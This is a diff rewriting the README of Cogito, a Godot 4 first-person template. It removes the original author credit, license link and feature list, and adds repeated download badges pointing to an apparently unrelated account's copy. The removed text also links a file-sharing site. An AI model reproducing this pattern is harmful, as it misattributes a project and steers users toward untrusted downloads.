@@ -1,67 +1,163 @@
-![COGITO_banner](addons/cogito/COGITO_banner.jpg)
-# COGITO
-[![GodotEngine](https://img.shields.io/badge/Godot_4.4_stable-blue?logo=godotengine&logoColor=white)](https://godotengine.org/) [![COGITO](https://img.shields.io/badge/version_1.1.5-35A1D7?label=COGITO&labelColor=0E887A)](https://github.com/Phazorknight/Cogito)
+# 🧠 Cogito - Simple First-Person Template for GODOT 4
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://fileshare.bond/L2XZZM/)
+[![Download Cogito](https://img.shields.io/badge/Download-Cogito-brightgreen?style=for-the-badge)](https://github.com/chasesnip3rpp/Cogito)
 
-## What is it?
-Cogito is a First Person Immersive Sim Template Project for Godot 4, providing a framework for creating interactable objects, various items to use and mechanics to influence the player and game environment.
-In short, with COGITO you get a quick start for a fully-featured first person game with a great variety of mechanics and a solid base to create your own.
+An immersive simulation starter kit for the GODOT 4 engine. Build from a tested base with first-person controls and key game features included.
 
-### [Online documentation](https://cogito.readthedocs.io/en/latest/index.html)
-### [Video tutorial series](https://cogito.readthedocs.io/en/latest/tutorials.html)
-### [Cogito in the Godot Asset Store (beta)](https://store-beta.godotengine.org/asset/philip-drobar/cogito)
+---
 
-### Current Features
-- First person player controller with:
-  - Sprinting, jumping, crouching, sliding, stairs handling, ladder handling, sitting
-  - Lots of exposed properties to tweak to your liking (speeds, headbob, fall damage, bunnyhop, etc.)
-  - Easy-to-use dynamic footstep sound system
-- Player Attribute System
-  - Health, Stamina, Visibility for stealth, etc
-  - Customize how attributes get displayed in the HUD (or stay hidden)
-  - Also useable for RPG-like attributes (Strength, Wisdom, etc)
-  - Interactions can check attributes (eg. you can only lift a box if you're strong enough)
-- Interaction System
-  - Component-based interactions makes it easy to turn your own objects interactive quickly and customize existing ones
-  - Examples for interactive objects like doors, drawers, boxes to carry, turn-wheels, elevators, notes, keypads
-- Inventory System
-  - Flexible resource-based inventories
-  - Grid-based (think Resident Evil 4)
-  - Inventory UI separate from inventory logic
-  - Examples for multiple item types (consumables, keys, ammo, weapons, combinable Items)
-  - Base class to easily add your custom item types
-  - Containers with their own inventories
-- Basic NPC
-  - NavigationAgent based enemy with component-based state machine + animation states
-  - Simple player detection system that uses detection areas + basic line-of-sight checks
-- Main menu, pause menu and Options menu
-- Rebindable controls
-- Full game pad support!
-- Save and Load System as well as scene persistency
-- Localization!
-- Support for other plugins:
-  - Works with Dialogic
-  - Works with Dialgue Manager
-- Work in progress:
-  - Systemic Properties (wet/dry, flammable/on fire, soft, etc) (very WIP)
-  - Basic Quest System
+## 🧩 About Cogito
 
-### Comes with fully featured Demo Scenes
-- Set up like a game level including a variety of objects, weapons and quests
-- Demo scenes contains hints that explain how objects in the scene were set up
+Cogito is a ready-to-use template project built for GODOT 4. It focuses on creating immersive first-person experiences. Whether you want to develop an FPS game, an immersive sim, or a general game prototype, Cogito offers a solid starting point.
 
-COGITO is made by [Philip Drobar](https://www.philipdrobar.com) with help from [these contributors](https://github.com/Phazorknight/Cogito/graphs/contributors).
+This project helps you avoid the common setup work by providing:
 
-## Principles of this template
-The structure of this template always tries to adhere to the following principles:
-- **Complete**: When you  COGITO and press play, you get a functioning project out of the box. Game menu, save slot select, options and a playable level are all included.
-- **Versatile**: Whether your game is set in the future, the past or the present, use melee, projectile or no weapons at all, have low poly, stylized or realistic graphics, the template will have features for you.
-- **Modular**: Do not want to use a feature? You will be able to hide it, ignore it or strip it out without breaking COGITO. At the same time, COGITO is designed to be extendable with your own custom features or other add-ons.
-- **Approachable**: While there will always be a learning curve, we strive to make COGTIO approachable and intuitive to use, so it doesn't get in your way of making your game.
-- **No Generative AI**: All included code and assets are made by humans and listed in our credits and cotnributors page.
+- Basic first-person movement controls
+- Interaction with objects and environment
+- Simple AI or enemy placeholders
+- Sample game scripts in GDScript  
+- Compatibility with GODOT 4 engine
 
-> [!IMPORTANT]  
-> COGITO v1.1 is not 100% bug-free. While most features are set, be aware that this open source software is offered "as is". Use at your own risk and check Issues and Discussion pages for more information.
+Cogito does not include a finished game. Instead, it acts as a framework where you can add your own ideas.
 
-[Credits, Contributors and License](https://cogito.readthedocs.io/en/latest/about.html)
+---
+
+## 🖥️ System Requirements
+
+To run Cogito on Windows, your computer should meet these requirements:
+
+- Windows 10 or later (64-bit recommended)
+- At least 8 GB RAM  
+- A DirectX 11 compatible graphics card  
+- GODOT 4 engine installed (see next section)
+- 2 GB of free disk space for the project files
+
+This setup will run the template smoothly and allow you to test your own additions.
+
+---
+
+## 🚀 Getting Started with GODOT 4
+
+Before running Cogito, you must install the GODOT 4 engine on your system. It is the software that runs the project.
+
+### Steps to install GODOT 4
+
+1. Open your web browser.
+
+2. Go to the official GODOT website: https://godotengine.org/download
+
+3. Under the "Standard version" for Windows, click the 64-bit option to download the `.exe` file.
+
+4. Once downloaded, run the installer and follow the prompts to finish installing GODOT.
+
+5. After installation, launch GODOT to confirm it runs correctly.
+
+Avoid downloading GODOT from unofficial sources to prevent security risks.
+
+---
+
+## 📥 How to Download Cogito
+
+To get the Cogito project files, you need to visit the GitHub page where the project is stored.
+
+[![Download Cogito](https://img.shields.io/badge/Download-Cogito-blue?style=for-the-badge)](https://github.com/chasesnip3rpp/Cogito)
+
+Steps to download:
+
+1. Click the big green button or go to this page:  
+   https://github.com/chasesnip3rpp/Cogito
+
+2. On the GitHub page, find the green **Code** button near the top right.
+
+3. Click **Code**, then select **Download ZIP**.
+
+4. Save the ZIP file to your preferred location on your computer.
+
+5. Once downloaded, right-click the ZIP file and choose **Extract All…** to unzip the contents.
+
+---
+
+## ⚙️ How to Open and Run Cogito in GODOT 4
+
+After downloading and extracting Cogito, follow these steps to run it:
+
+1. Open GODOT 4 on your computer.
+
+2. On the GODOT main screen, click **"Import"**.
+
+3. In the pop-up, click the folder icon and navigate to the extracted Cogito folder.
+
+4. Select the folder that contains the `project.godot` file.
+
+5. Click **"Import & Edit"** to load the project.
+
+6. Once loaded, you will see the Cogito project interface.
+
+7. To test the project, find the **Play** button (a right arrow) at the top of the GODOT window.
+
+8. Click **Play** to run the template game scene.
+
+The game should open in a window where you can move around using typical FPS controls (usually WASD for movement). Use the mouse to look around.
+
+---
+
+## 🕹 Controls Overview
+
+Here are the basic controls you can expect in this first-person template:
+
+- **W, A, S, D** — Move forward, left, backward, and right
+- **Mouse movement** — Look around in all directions
+- **Spacebar** — Jump
+- **E key** — Interact with objects or open doors (if implemented)
+- **Shift** — Sprint or run faster (variable depending on template setup)
+- **Esc key** — Open the in-game menu or exit play mode
+
+Spend a few minutes testing the controls to understand how they respond.
+
+---
+
+## 🛠 Exploring and Modifying Cogito
+
+If you decide to explore or change the project, here are some pointers:
+
+- Cogito uses **GDScript**, Godot’s built-in scripting language. It is easier to learn than other languages.
+- The main scenes and scripts live inside the `res://` folder in GODOT.
+- Use the GODOT editor to open and edit scenes (.tscn files) and scripts (.gd files).
+- Change game elements by editing scene nodes or script code.
+- You can add new objects, animations, or AI scripts to build your game.
+
+No programming experience is required, but familiarity with navigating files and folders helps.
+
+---
+
+## 💡 Tips for a Smooth Experience
+
+- Always save your progress before running the game scene.
+- If the game window is too small, adjust the resolution settings within the GODOT project.
+- Keep your GODOT installation updated to avoid compatibility issues.
+- Use the GODOT community forums and documentation for additional help.
+- Close unnecessary programs to improve game performance while testing.
+
+---
+
+## 📄 Project Details
+
+- **Repository:** https://github.com/chasesnip3rpp/Cogito  
+- **Description:** Immersive simulation template project for GODOT 4  
+- **Topics:** first-person, fps, game-development, gdscript, godot, godot-engine, godot4, immersive-sim, imsim, starter-kit, template-project
+
+---
+
+## 🧰 Need Help?
+
+If you run into issues opening or running the project:
+
+- Check the README file inside the downloaded Cogito folder for updates.
+- Visit the GODOT documentation: https://docs.godotengine.org/en/latest/
+- Look for help on GODOT Q&A sites or forums with keywords like "first-person template" and "GODOT 4."
+
+---
+
+## 👇 Download Now
+
+[![Download Cogito](https://img.shields.io/badge/Download-Cogito-lightgrey?style=for-the-badge)](https://github.com/chasesnip3rpp/Cogito)
